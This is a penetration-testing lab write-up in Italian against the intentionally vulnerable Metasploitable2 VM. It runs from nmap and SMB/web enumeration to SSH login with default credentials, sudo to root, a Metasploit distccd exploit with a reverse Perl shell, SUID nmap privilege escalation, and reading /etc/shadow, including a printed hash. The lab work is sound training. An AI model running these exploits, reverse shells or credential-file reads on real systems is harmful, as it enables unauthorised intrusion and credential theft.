# Metasploitable2 Lab

Laboratorio pratico svolto in ambiente controllato con Kali Linux e Metasploitable2 su VirtualBox.

> Tutti i comandi sono stati eseguiti esclusivamente in un laboratorio locale autorizzato.

---

## 1. Obiettivo del laboratorio

Obiettivo: eseguire una metodologia base di penetration testing su Metasploitable2.

Flusso seguito:

```text
Reconnaissance
Network Discovery
Port Scanning
Service Enumeration
Web Enumeration
SMB Enumeration
Initial Access
Post-Exploitation
Privilege Escalation
```

---

## 2. Ambiente di laboratorio

Macchine utilizzate:

```text
Kali Linux        → macchina attaccante
Metasploitable2   → macchina target vulnerabile
VirtualBox        → ambiente di virtualizzazione
Samsung T7 SSD    → storage laboratorio
```

Configurazione rete:

```text
Kali eth0 → NAT / Internet
Kali eth1 → Host-only / laboratorio

Metasploitable2 eth0 → Host-only / laboratorio
```

IP rilevati:

```text
Kali:             192.168.1.101
Metasploitable2:  192.168.1.100
```

---

## 3. Network Discovery

Comando usato per identificare gli host attivi nella rete Host-only:

```bash
nmap -sn 192.168.1.0/24
```

Risultato:

```text
192.168.1.1    → VirtualBox Host-Only Adapter
192.168.1.100  → Metasploitable2
192.168.1.101  → Kali Linux
```

Target selezionato:

```text
192.168.1.100
```

---

## 4. Port Scanning

Scansione completa delle porte TCP:

```bash
nmap -p- -T4 192.168.1.100
```

Porte aperte rilevate:

```text
21/tcp    ftp
22/tcp    ssh
23/tcp    telnet
25/tcp    smtp
53/tcp    domain
80/tcp    http
111/tcp   rpcbind
139/tcp   netbios-ssn
445/tcp   microsoft-ds
512/tcp   exec
513/tcp   login
514/tcp   shell
1099/tcp  rmiregistry
1524/tcp  ingreslock / bindshell
2049/tcp  nfs
2121/tcp  ftp
3306/tcp  mysql
3632/tcp  distccd
5432/tcp  postgresql
5900/tcp  vnc
6000/tcp  X11
6667/tcp  irc
6697/tcp  ircs-u
8009/tcp  ajp13
8180/tcp  http
```

---

## 5. Service Enumeration

Scansione con script, version detection e OS detection:

```bash
nmap -sC -sV -A -T4 192.168.1.100
```

Servizi principali identificati:

```text
21/tcp   vsftpd 2.3.4
22/tcp   OpenSSH 4.7p1 Debian
23/tcp   Linux telnetd
80/tcp   Apache httpd 2.2.8 Ubuntu DAV/2
139/tcp  Samba
445/tcp  Samba 3.0.20-Debian
1524/tcp Metasploitable root shell
2049/tcp NFS
2121/tcp ProFTPD 1.3.1
3306/tcp MySQL 5.0.51a
5432/tcp PostgreSQL 8.3
5900/tcp VNC
6667/tcp UnrealIRCd
8180/tcp Apache Tomcat/Coyote JSP engine
```

Informazioni sistema:

```text
OS: Linux 2.6.x
Hostname: metasploitable
FQDN: metasploitable.localdomain
```

---

## 6. FTP Enumeration

Servizio rilevato:

```text
21/tcp open ftp vsftpd 2.3.4
Anonymous FTP login allowed
```

Connessione FTP:

```bash
ftp 192.168.1.100
```

Credenziali usate:

```text
Username: anonymous
Password: anonymous
```

Comandi usati dentro FTP:

```text
pwd
ls
dir
bye
```

Risultato:

```text
Login anonymous riuscito.
Directory FTP vuota.
Nessun file utile trovato.
```

Conclusione:

```text
FTP anonymous abilitato, ma nessun backup o file interessante presente.
Servizio da annotare per possibile vulnerabilità nota di vsftpd 2.3.4.
```

---

## 7. Web Enumeration

Fingerprinting web:

```bash
whatweb http://192.168.1.100
curl -I http://192.168.1.100
```

Risultati:

```text
Apache 2.2.8 Ubuntu DAV/2
PHP 5.2.4
Title: Metasploitable2 - Linux
WebDAV presente
```
## 7.1 WebDAV PROPFIND Enumeration

Durante la web enumeration è stata individuata la directory:

```text
/dav/
```

Il server mostrava supporto WebDAV:

```text
Apache/2.2.8 (Ubuntu) DAV/2
```

Controllo dei metodi HTTP sulla directory `/dav/`:

```bash
curl -i -X OPTIONS http://192.168.1.100/dav/
```

Risultato importante:

```text
HTTP/1.1 200 OK
Server: Apache/2.2.8 (Ubuntu) DAV/2
DAV: 1,2
MS-Author-Via: DAV
Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK
```

Interpretazione:

```text
WebDAV è attivo su /dav/.
Sono presenti diversi metodi WebDAV rischiosi.
Il metodo PUT non risulta abilitato, quindi upload diretto non disponibile.
```

Controllo con Nmap:

```bash
nmap --script http-methods --script-args http-methods.url-path=/dav/ -p 80 192.168.1.100
```

Risultato:

```text
Supported Methods: OPTIONS GET HEAD POST DELETE TRACE PROPFIND PROPPATCH COPY MOVE LOCK UNLOCK
Potentially risky methods: DELETE TRACE PROPFIND PROPPATCH COPY MOVE LOCK UNLOCK
Path tested: /dav/
```

Prima richiesta PROPFIND:

```bash
curl -i -X PROPFIND http://192.168.1.100/dav/
```

Risultato:

```text
HTTP/1.1 403 Forbidden
PROPFIND requests with a Depth of "infinity" are not allowed for /dav/.
```

Interpretazione:

```text
La richiesta PROPFIND senza header Depth viene interpretata come richiesta troppo ampia.
Il server blocca Depth infinity.
```

Richiesta corretta con Depth 0:

```bash
curl -i -X PROPFIND -H "Depth: 0" http://192.168.1.100/dav/
```

Richiesta corretta con Depth 1:

```bash
curl -i -X PROPFIND -H "Depth: 1" http://192.168.1.100/dav/
```

Risultato:

```text
HTTP/1.1 207 Multi-Status
<D:href>/dav/</D:href>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
```

Interpretazione:

```text
PROPFIND funziona se viene specificato l’header Depth.
La directory /dav/ è una collection WebDAV.
Non sono stati trovati file utili all’interno della directory.
```

Conclusione:

```text
WebDAV è attivo e configurato con metodi rischiosi.
PUT non è presente, quindi non è stato possibile eseguire upload diretto tramite WebDAV.
PROPFIND con Depth 0/1 funziona, ma non espone file utili.
Il ramo WebDAV è stato documentato e poi abbandonato come vettore di accesso iniziale.
```
Controllo metodi HTTP:

```bash
nmap --script http-methods -p 80 192.168.1.100
```

Risultato:

```text
Supported Methods: GET HEAD POST OPTIONS
```

Interpretazione:

```text
PUT non abilitato.
WebDAV presente, ma upload diretto non disponibile sulla porta 80.
```

Directory enumeration:

```bash
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
```

Directory e file trovati:

```text
.htpasswd       403
.hta            403
.htaccess       403
cgi-bin/        403
dav             301
index.php       200
phpMyAdmin      301
phpinfo.php     200
server-status   403
test            301
twiki           301
```

---

## 8. phpinfo.php Enumeration

Comandi usati:

```bash
curl -s http://192.168.1.100/phpinfo.php | grep -i "document_root"
curl -s http://192.168.1.100/phpinfo.php | grep -i "server_software"
curl -s http://192.168.1.100/phpinfo.php | grep -i "disable_functions"
```

Risultati importanti:

```text
DOCUMENT_ROOT: /var/www/
SERVER_SOFTWARE: Apache/2.2.8 (Ubuntu) DAV/2
disable_functions: no value
```

Interpretazione:

```text
Document root web: /var/www/
Apache e PHP sono versioni vecchie.
Le funzioni PHP non risultano disabilitate.
```

---

## 9. phpMyAdmin Check

Controllo phpMyAdmin:

```bash
curl -I http://192.168.1.100/phpMyAdmin/
```

Risultato:

```text
HTTP/1.1 200 OK
Set-Cookie: phpMyAdmin=...
Content-Type: text/html
```

Interpretazione:

```text
phpMyAdmin è raggiungibile.
La pagina di login è accessibile.
```

Credenziali semplici provate:

```text
root / root
root / password
root / vuoto
admin / admin
```

Risultato:

```text
Accesso non riuscito.
```

Conclusione:

```text
phpMyAdmin raggiungibile, ma accesso non ottenuto con credenziali semplici.
Passare a credential hunting tramite altri servizi.
```

---

## 10. SMB Enumeration

Enumerazione share SMB:

```bash
smbclient -L //192.168.1.100 -N
```

Risultato:

```text
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service
ADMIN$          IPC       IPC Service
```

Enumerazione approfondita:

```bash
enum4linux -a 192.168.1.100
```

Script Nmap SMB:

```bash
nmap --script smb-enum-shares,smb-enum-users -p 139,445 192.168.1.100
nmap --script smb-os-discovery,smb-security-mode -p 139,445 192.168.1.100
```

Risultati importanti:

```text
Samba 3.0.20-Debian
Computer name: metasploitable
Domain name: localdomain
FQDN: metasploitable.localdomain
SMB message signing disabled
Share tmp anonymous READ/WRITE
```

Utenti interessanti enumerati:

```text
msfadmin
user
root
www-data
postgres
mysql
tomcat55
service
backup
ftp
```

---

## 11. Accesso alla share tmp

Connessione alla share:

```bash
smbclient //192.168.1.100/tmp -N
```

Comandi usati:

```text
pwd
ls
dir
exit
```

Contenuto trovato:

```text
.ICE-unix
.X11-unix
.X0-lock
4570.jsvc_up
```

Interpretazione:

```text
La share tmp è accessibile anonimamente.
La share risulta READ/WRITE.
Non sono stati trovati file utili come backup, configurazioni o credenziali.
```

---

## 12. Initial Access via SSH

Durante l’enumerazione SMB è stato identificato l’utente:

```text
msfadmin
```

È stata provata una credenziale nota del laboratorio:

```text
Username: msfadmin
Password: msfadmin
```

Primo tentativo SSH:

```bash
ssh msfadmin@192.168.1.100
```

Errore:

```text
Unable to negotiate with 192.168.1.100 port 22:
no matching host key type found.
Their offer: ssh-rsa,ssh-dss
```

Interpretazione:

```text
Il server SSH del target è vecchio.
Kali moderna blocca alcuni algoritmi legacy.
```

Comando corretto usato:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.1.100
```

Password:

```text
msfadmin
```

Accesso riuscito:

```text
msfadmin@metasploitable:~$
```

---

## 13. Post-Exploitation Enumeration

Comandi eseguiti dopo accesso SSH:

```bash
whoami
id
hostname
uname -a
ip a
sudo -l
```

Risultati:

```text
whoami: msfadmin
hostname: metasploitable
Kernel: Linux 2.6.24-16-server
IP: 192.168.1.100/24
```

Output importante di `id`:

```text
uid=1000(msfadmin) gid=1000(msfadmin)
groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
```

Output importante di `sudo -l`:

```text
User msfadmin may run the following commands on this host:
    (ALL) ALL
```

Interpretazione:

```text
L’utente msfadmin può eseguire qualsiasi comando come root tramite sudo.
```

---

## 14. Privilege Escalation

Comando usato:

```bash
sudo -i
```

Password:

```text
msfadmin
```

Verifica privilegi:

```bash
whoami
id
hostname
pwd
```

Risultato:

```text
whoami: root
uid=0(root) gid=0(root) groups=0(root)
hostname: metasploitable
pwd: /root
```

Privilege escalation riuscita.

---

## 15. Catena completa dell’attacco

```text
Network discovery
↓
Port scanning
↓
Service enumeration
↓
Web enumeration
↓
SMB enumeration
↓
User discovery: msfadmin
↓
SSH access with known lab credentials
↓
sudo -l
↓
sudo -i
↓
root shell
```

---

## 16. Risultato finale

```text
Target compromesso: sì
Initial access: SSH con msfadmin
Privilege escalation: sudo -i
Privilegio finale: root
```

---

## 17. Lezioni apprese

Punti importanti del laboratorio:

```text
Enumeration prima dell’exploitation
Non saltare direttamente agli exploit
Controllare sempre credenziali note/deboli in laboratorio
SMB può rivelare utenti e share interessanti
phpMyAdmin accessibile non significa automaticamente accesso
sudo -l è fondamentale dopo initial access
Gli algoritmi SSH legacy possono richiedere opzioni specifiche
```

---

## 18. Comandi principali usati

```bash
nmap -sn 192.168.1.0/24
nmap -p- -T4 192.168.1.100
nmap -sC -sV -A -T4 192.168.1.100

ftp 192.168.1.100

whatweb http://192.168.1.100
curl -I http://192.168.1.100
nmap --script http-methods -p 80 192.168.1.100
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

curl -I http://192.168.1.100/phpMyAdmin/
curl -s http://192.168.1.100/phpinfo.php | grep -i "document_root"
curl -s http://192.168.1.100/phpinfo.php | grep -i "server_software"
curl -s http://192.168.1.100/phpinfo.php | grep -i "disable_functions"

smbclient -L //192.168.1.100 -N
enum4linux -a 192.168.1.100
smbclient //192.168.1.100/tmp -N

nmap --script smb-enum-shares,smb-enum-users -p 139,445 192.168.1.100
nmap --script smb-os-discovery,smb-security-mode -p 139,445 192.168.1.100

ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.1.100

whoami
id
hostname
uname -a
ip a
sudo -l
sudo -i
```

---

## Distccd Exploitation and SUID Nmap Privilege Escalation

Durante la service enumeration è stato identificato il servizio `distccd` sulla porta 3632:

```text
3632/tcp open distccd distccd v1
```

Questo servizio è stato analizzato come possibile vettore di accesso tramite Metasploit.

---

## Ricerca del modulo Metasploit

Avvio Metasploit:

```bash
msfconsole
```

Ricerca modulo:

```text
search distccd
```

Modulo trovato:

```text
exploit/unix/misc/distcc_exec
```

Selezione modulo:

```text
use exploit/unix/misc/distcc_exec
```

Controllo opzioni:

```text
show options
```

---

## Primo tentativo con payload reverse_bash

Metasploit ha selezionato inizialmente il payload:

```text
cmd/unix/reverse_bash
```

Configurazione:

```text
set RHOSTS 192.168.1.100
set LHOST 192.168.1.101
set LPORT 4445
run
```

Errore ottenuto:

```text
bash: /dev/tcp/192.168.1.101/4445: No such file or directory
Exploit completed, but no session was created.
```

Interpretazione:

```text
L’exploit è stato eseguito, ma il payload reverse_bash non ha creato una sessione.
Il problema era legato all’uso di /dev/tcp sul target.
```

---

## Correzione: cambio payload

Sono stati visualizzati i payload disponibili:

```text
show payloads
```

Payload scelto:

```text
payload/cmd/unix/reverse_perl
```

Configurazione corretta:

```text
set payload payload/cmd/unix/reverse_perl
set RHOSTS 192.168.1.100
set LHOST 192.168.1.101
set LPORT 4446
run
```

Risultato:

```text
Command shell session 1 opened
192.168.1.101:4446 -> 192.168.1.100:57883
```

Interpretazione:

```text
Exploit riuscito.
Reverse shell ottenuta sul target.
```

---

## Verifica della shell

Comandi eseguiti nella shell:

```bash
whoami
id
hostname
uname -a
pwd
```

Risultati:

```text
whoami: daemon
id: uid=1(daemon) gid=1(daemon) groups=1(daemon)
hostname: metasploitable
uname -a: Linux metasploitable 2.6.24-16-server i686 GNU/Linux
pwd: /tmp
```

Interpretazione:

```text
L’exploit distccd ha fornito accesso come utente daemon.
La shell non è root.
È necessaria una fase di privilege escalation.
```

---

## Post-Exploitation Enumeration

Enumerazione utenti locali:

```bash
cat /etc/passwd
```

Utenti interessanti trovati:

```text
root
msfadmin
user
service
postgres
mysql
tomcat55
www-data
daemon
```

Enumerazione home directory:

```bash
ls -la /home
ls -la /home/msfadmin
ls -la /home/user
ls -la /home/service
```

Risultati importanti:

```text
/home/msfadmin
/home/user
/home/service
```

Enumerazione web root:

```bash
ls -la /var/www
```

Risultati importanti:

```text
/var/www/dav
/var/www/dvwa
/var/www/mutillidae
/var/www/phpMyAdmin
/var/www/phpinfo.php
/var/www/twiki
```

Controllo accesso a file root:

```bash
cat /root/.rhosts 2>&1
cat /root/reset_logs.sh 2>&1
```

Risultato iniziale:

```text
Permission denied
```

Interpretazione:

```text
L’utente daemon non aveva ancora privilegi sufficienti per leggere file protetti in /root.
```

---

## Ricerca file SUID

Comando usato:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Risultato importante:

```text
/usr/bin/nmap
```

Interpretazione:

```text
Il binario /usr/bin/nmap ha il bit SUID attivo.
Una versione vecchia di Nmap con modalità interattiva può essere usata per eseguire una shell con privilegi elevati.
```

---

## Privilege Escalation con SUID Nmap

Avvio modalità interattiva di Nmap:

```bash
/usr/bin/nmap --interactive
```

Prompt ottenuto:

```text
nmap>
```

Esecuzione shell dalla modalità interattiva:

```bash
!sh
```

Verifica privilegi:

```bash
whoami
id
hostname
pwd
```

Risultati:

```text
whoami: root
id: uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
hostname: metasploitable
pwd: /tmp
```

Interpretazione:

```text
uid=1(daemon) indica l’utente reale.
euid=0(root) indica che il processo sta eseguendo con privilegi effettivi di root.
La privilege escalation è riuscita.
```

---

## Conferma accesso root

Lettura di `/etc/shadow`:

```bash
cat /etc/shadow | head
```

Risultato:

```text
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
```

Interpretazione:

```text
/etc/shadow contiene hash delle password degli utenti Linux.
La lettura di questo file conferma privilegi root o equivalenti.
```

Lettura di `/root/reset_logs.sh`:

```bash
cat /root/reset_logs.sh
```

Risultato:

```text
File letto correttamente.
Prima della privilege escalation dava Permission denied.
```

Interpretazione:

```text
La lettura di file protetti in /root conferma il successo della privilege escalation.
```

---

## Catena completa

```text
Nmap trova distccd su 3632
↓
Metasploit: exploit/unix/misc/distcc_exec
↓
Payload reverse_bash fallisce
↓
Cambio payload: reverse_perl
↓
Shell come daemon
↓
Post-exploitation enumeration
↓
find / -perm -4000 -type f 2>/dev/null
↓
Trovato /usr/bin/nmap SUID
↓
/usr/bin/nmap --interactive
↓
!sh
↓
euid=0(root)
↓
lettura /etc/shadow
↓
lettura /root/reset_logs.sh
```

---

## Lezioni apprese

```text
Exploit riuscito non significa sempre root.
Se la shell è utente basso, serve post-exploitation.
La ricerca dei file SUID è fondamentale per privilege escalation Linux.
Il parametro euid=0(root) indica privilegi effettivi root.
Il payload corretto può fare la differenza tra exploit fallito e sessione funzionante.
```

---

## Nota etica

Questo test è stato svolto esclusivamente su Metasploitable2, macchina vulnerabile progettata per laboratori locali autorizzati.

Non utilizzare questi comandi contro sistemi reali senza autorizzazione esplicita.



